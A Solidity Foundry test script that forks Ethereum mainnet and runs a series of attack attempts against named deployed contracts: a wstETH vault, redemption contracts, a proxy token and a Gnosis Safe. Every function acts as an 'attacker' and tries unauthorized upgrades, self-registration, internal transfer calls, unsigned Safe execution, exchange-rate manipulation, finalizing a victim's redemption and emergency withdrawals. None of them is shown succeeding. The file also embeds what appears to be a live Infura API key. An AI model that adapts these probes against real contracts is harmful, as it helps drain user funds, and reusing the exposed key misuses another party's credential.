// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

interface IwstETH {
    function wrap(uint256) external returns (uint256);
    function unwrap(uint256) external returns (uint256);
    function stETH() external view returns (address);
    function getWstETHByStETH(uint256) external view returns (uint256);
    function getStETHByWstETH(uint256) external view returns (uint256);
}

/**
 * ALTERNATIVE PATHWAYS - COMPLETELY DIFFERENT ATTACK ANGLES
 * 
 * Instead of bypassing the delay, what if we:
 * 1. Attack TASSET proxy directly (176 bytes = minimal proxy)
 * 2. Manipulate the exchange rate
 * 3. Become a registered redemption contract
 * 4. Attack the vault's transfer mechanism
 * 5. Exploit the Gnosis Safe
 */
contract AlternativePathways is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
    address constant GNOSIS_SAFE = 0x22261B4D6F629D8cF946C3524df86bF7222901F6;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AttackTASSETProxy() public {
        console.log("=== ATTACK TASSET PROXY ===\n");

        // TASSET is only 176 bytes - likely a minimal proxy
        console.log("TASSET:", TASSET);
        console.log("Code size:", TASSET.code.length);

        // Get the implementation address
        // EIP-1967 implementation slot
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(TASSET, implSlot);
        console.log("EIP-1967 impl:");
        console.logBytes32(implValue);

        // Check TASSET storage directly
        console.log("\nTASSET storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(TASSET, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // TASSET.slot2 = wstETH - this is the underlying!
        // What if TASSET is just a wrapped wstETH?

        // Try to call implementation directly
        address impl = address(uint160(uint256(vm.load(TASSET, bytes32(uint256(2))))));
        console.log("\nPotential implementation at slot 2:", impl);

        // Can we upgrade TASSET?
        vm.startPrank(attacker);
        (bool s1,) = TASSET.call(abi.encodeWithSignature("upgradeTo(address)", attacker));
        console.log("upgradeTo:", s1);

        (bool s2,) = TASSET.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", attacker, ""));
        console.log("upgradeToAndCall:", s2);
        vm.stopPrank();
    }

    function test_VaultAllowanceExploit() public {
        console.log("=== VAULT ALLOWANCE EXPLOIT ===\n");

        // Check who vault has given allowance to
        address[] memory spenders = new address[](10);
        spenders[0] = R0;
        spenders[1] = R1;
        spenders[2] = RC;
        spenders[3] = TIMELOCK;
        spenders[4] = TASSET;
        spenders[5] = attacker;
        spenders[6] = address(0);
        spenders[7] = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47; // VAULT.slot5
        spenders[8] = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a; // VAULT.slot2
        spenders[9] = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e; // VAULT.slot5.slot5

        console.log("wstETH allowances from VAULT:");
        for (uint i = 0; i < spenders.length; i++) {
            uint256 allowance = IERC20(wstETH).allowance(VAULT, spenders[i]);
            if (allowance > 0) {
                console.log("Spender %d has allowance:", i, allowance / 1e18, "wstETH");
                console.logAddress(spenders[i]);
            }
        }

        // Check TASSET allowances
        console.log("\nTASSET allowances from VAULT:");
        for (uint i = 0; i < spenders.length; i++) {
            uint256 allowance = IERC20(TASSET).allowance(VAULT, spenders[i]);
            if (allowance > 0) {
                console.log("Spender %d has TASSET allowance:", i, allowance / 1e18);
            }
        }
    }

    function test_BecomeRegisteredRedemption() public {
        console.log("=== BECOME REGISTERED REDEMPTION ===\n");

        // R0 and R1 are registered. How?
        // Check RC for registration mechanism

        // RC storage
        console.log("RC storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(RC, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // RC.slot3 = 2 - could this be a counter for registered contracts?
        // Let's check if we can register

        vm.startPrank(attacker);

        (bool s1,) = RC.call(abi.encodeWithSignature("register(address)", attacker));
        console.log("register(attacker):", s1);

        (bool s2,) = RC.call(abi.encodeWithSignature("addRedemption(address)", attacker));
        console.log("addRedemption(attacker):", s2);

        (bool s3,) = RC.call(abi.encodeWithSignature("setRedemption(address)", attacker));
        console.log("setRedemption(attacker):", s3);

        (bool s4,) = RC.call(abi.encodeWithSignature("createRedemption()"));
        console.log("createRedemption():", s4);

        vm.stopPrank();
    }

    function test_TraceVaultTransferMechanism() public {
        console.log("=== TRACE VAULT TRANSFER MECHANISM ===\n");

        // When finalizeRedeem is called, how does wstETH get from VAULT to recipient?
        // Is it a direct transfer, or through some mechanism?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Check vault's code for transfer patterns
        bytes memory vaultCode = VAULT.code;
        console.log("Vault code size:", vaultCode.length);

        // Count CALLs in vault
        uint callCount = 0;
        for (uint i = 0; i < vaultCode.length; i++) {
            if (uint8(vaultCode[i]) == 0xF1) callCount++;
        }
        console.log("CALL opcodes in vault:", callCount);

        // Check what functions vault exposes for transfers
        (bool s1, bytes memory d1) = VAULT.staticcall(abi.encodeWithSignature("asset()"));
        if (s1 && d1.length > 0) {
            console.log("Vault asset:", abi.decode(d1, (address)));
        }

        // Can we call vault's internal transfer?
        vm.startPrank(attacker);

        (bool t1,) = VAULT.call(abi.encodeWithSignature("_transfer(address,uint256)", attacker, 1000e18));
        console.log("_transfer:", t1);

        (bool t2,) = VAULT.call(abi.encodeWithSignature("internalTransfer(address,uint256)", attacker, 1000e18));
        console.log("internalTransfer:", t2);

        (bool t3,) = VAULT.call(abi.encodeWithSignature("safeTransfer(address,address,uint256)", wstETH, attacker, 1000e18));
        console.log("safeTransfer:", t3);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_ExploitGnosisSafe() public {
        console.log("=== EXPLOIT GNOSIS SAFE ===\n");

        // GNOSIS_SAFE owns VAULT.slot2
        console.log("Gnosis Safe:", GNOSIS_SAFE);
        console.log("Code size:", GNOSIS_SAFE.code.length);

        // This is a Gnosis Safe proxy - check its configuration
        // Safe slot 0 = singleton (master copy)
        bytes32 singleton = vm.load(GNOSIS_SAFE, bytes32(uint256(0)));
        console.log("Singleton (master copy):");
        console.logBytes32(singleton);

        // Check threshold and owners
        (bool s1, bytes memory d1) = GNOSIS_SAFE.staticcall(abi.encodeWithSignature("getThreshold()"));
        if (s1 && d1.length > 0) {
            console.log("Threshold:", abi.decode(d1, (uint256)));
        }

        (bool s2, bytes memory d2) = GNOSIS_SAFE.staticcall(abi.encodeWithSignature("getOwners()"));
        if (s2 && d2.length > 0) {
            address[] memory owners = abi.decode(d2, (address[]));
            console.log("Owner count:", owners.length);
            for (uint i = 0; i < owners.length && i < 5; i++) {
                console.log("  Owner %d:", i, owners[i]);
            }
        }

        // Check nonce
        (bool s3, bytes memory d3) = GNOSIS_SAFE.staticcall(abi.encodeWithSignature("nonce()"));
        if (s3 && d3.length > 0) {
            console.log("Nonce:", abi.decode(d3, (uint256)));
        }

        // Can we execute through the safe with fake signatures?
        // (This won't work, but let's see the error)
        vm.startPrank(attacker);

        bytes memory txData = abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18);

        // execTransaction(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures)
        (bool exec,) = GNOSIS_SAFE.call(
            abi.encodeWithSignature(
                "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
                VAULT,      // to
                0,          // value
                txData,     // data
                0,          // operation (CALL)
                0,          // safeTxGas
                0,          // baseGas
                0,          // gasPrice
                address(0), // gasToken
                address(0), // refundReceiver
                ""          // signatures (empty - will fail)
            )
        );
        console.log("execTransaction (no sigs):", exec);

        vm.stopPrank();
    }

    function test_ManipulateExchangeRate() public {
        console.log("=== MANIPULATE EXCHANGE RATE ===\n");

        // wstETH wraps stETH at a rate that changes with rebasing
        // Can we manipulate this rate?

        uint256 currentRate = IwstETH(wstETH).getStETHByWstETH(1e18);
        console.log("Current rate (stETH per wstETH):", currentRate / 1e16, "/ 100");

        // Check stETH total supply
        uint256 stETHSupply = IERC20(stETH).totalSupply();
        console.log("stETH total supply:", stETHSupply / 1e18);

        // Check wstETH total supply
        uint256 wstETHSupply = IERC20(wstETH).totalSupply();
        console.log("wstETH total supply:", wstETHSupply / 1e18);

        // The rate is determined by: stETH.getPooledEthByShares(wstETHAmount)
        // Can we donate to stETH to inflate the rate?

        // Get some ETH and try to donate
        vm.deal(attacker, 1000 ether);
        vm.startPrank(attacker);

        // Try to donate directly to stETH
        (bool d1,) = stETH.call{value: 100 ether}("");
        console.log("Direct donate to stETH:", d1);

        // Check if rate changed
        uint256 newRate = IwstETH(wstETH).getStETHByWstETH(1e18);
        console.log("Rate after donation:", newRate / 1e16, "/ 100");

        if (newRate != currentRate) {
            console.log("*** RATE CHANGED! ***");
        }

        vm.stopPrank();
    }

    function test_FrontRunOtherRedemptions() public {
        console.log("=== FRONT-RUN OTHER REDEMPTIONS ===\n");

        // If another user has a redemption ready, can we front-run?
        // This requires finding an existing ready redemption

        // Simulate another user creating and waiting
        address victim = makeAddr("victim");
        deal(TASSET, victim, 10000e18);

        vm.startPrank(victim);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Wait 7 days
        vm.warp(block.timestamp + 7 days + 1);

        // Now attacker tries to front-run
        vm.startPrank(attacker);

        // Can attacker finalize victim's redemption?
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        (bool f1,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("Attacker finalize victim's redemption:", f1);
        console.log("Attacker gained:", (attackerAfter - attackerBefore) / 1e18, "wstETH");

        vm.stopPrank();

        // Check victim's balance
        uint256 victimBal = IERC20(wstETH).balanceOf(victim);
        console.log("Victim wstETH:", victimBal / 1e18);

        // Victim finalizes
        vm.startPrank(victim);
        (bool f2,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Victim finalize:", f2);
        console.log("Victim final wstETH:", IERC20(wstETH).balanceOf(victim) / 1e18);
        vm.stopPrank();
    }

    function test_PermitExploit() public {
        console.log("=== PERMIT EXPLOIT ===\n");

        // TASSET has DOMAIN_SEPARATOR and nonces - supports permit
        // Can we use permit to do something unexpected?

        (bool s1, bytes memory d1) = TASSET.staticcall(abi.encodeWithSignature("DOMAIN_SEPARATOR()"));
        if (s1 && d1.length > 0) {
            console.log("DOMAIN_SEPARATOR:");
            console.logBytes32(abi.decode(d1, (bytes32)));
        }

        // Check permit signature
        bytes4 permitSig = bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"));
        console.log("Permit selector:");
        console.logBytes4(permitSig);

        // If we can forge a permit signature (replay from another chain/contract?)
        // we might be able to approve ourselves for someone else's TASSET

        // Check for permit replay protection
        (bool s2, bytes memory d2) = TASSET.staticcall(abi.encodeWithSignature("nonces(address)", attacker));
        if (s2 && d2.length > 0) {
            console.log("Attacker nonce:", abi.decode(d2, (uint256)));
        }
    }

    function test_EmergencyModeExploit() public {
        console.log("=== EMERGENCY MODE EXPLOIT ===\n");

        // If we can trigger emergency mode, maybe controls relax?

        // Check current pause state
        (bool p1, bytes memory d1) = R0.staticcall(abi.encodeWithSignature("paused()"));
        if (p1 && d1.length > 0) {
            console.log("R0 paused:", abi.decode(d1, (bool)));
        }

        (bool p2, bytes memory d2) = VAULT.staticcall(abi.encodeWithSignature("paused()"));
        if (p2 && d2.length > 0) {
            console.log("Vault paused:", abi.decode(d2, (bool)));
        }

        // Try to trigger emergency functions
        vm.startPrank(attacker);

        (bool e1,) = R0.call(abi.encodeWithSignature("emergencyPause()"));
        console.log("R0 emergencyPause:", e1);

        (bool e2,) = VAULT.call(abi.encodeWithSignature("emergencyPause()"));
        console.log("Vault emergencyPause:", e2);

        (bool e3,) = RC.call(abi.encodeWithSignature("emergencyPause()"));
        console.log("RC emergencyPause:", e3);

        // Try emergency withdraw
        (bool w1,) = VAULT.call(abi.encodeWithSignature("emergencyWithdraw()"));
        console.log("Vault emergencyWithdraw:", w1);

        (bool w2,) = R0.call(abi.encodeWithSignature("emergencyWithdraw()"));
        console.log("R0 emergencyWithdraw:", w2);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_DirectVaultTransferFrom() public {
        console.log("=== DIRECT VAULT TRANSFER_FROM ===\n");

        // What if vault has approved max to some contract?
        // And that contract has a vulnerability?

        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH:", vaultBal / 1e18);

        // Try to transferFrom vault directly
        vm.startPrank(attacker);

        (bool t1,) = address(wstETH).call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VAULT, attacker, 1000e18)
        );
        console.log("Direct transferFrom vault:", t1);

        vm.stopPrank();

        // Check if R0 can transferFrom vault
        // First, does vault have infinite allowance to R0?
        // If so, and we can make R0 call transferFrom on our behalf...

        uint256 vaultToR0Allowance = IERC20(wstETH).allowance(VAULT, R0);
        console.log("Vault->R0 allowance:", vaultToR0Allowance);

        // RC calls vault.safeTransfer during finalize
        // Can we trigger that path without proper redemption?
    }
}
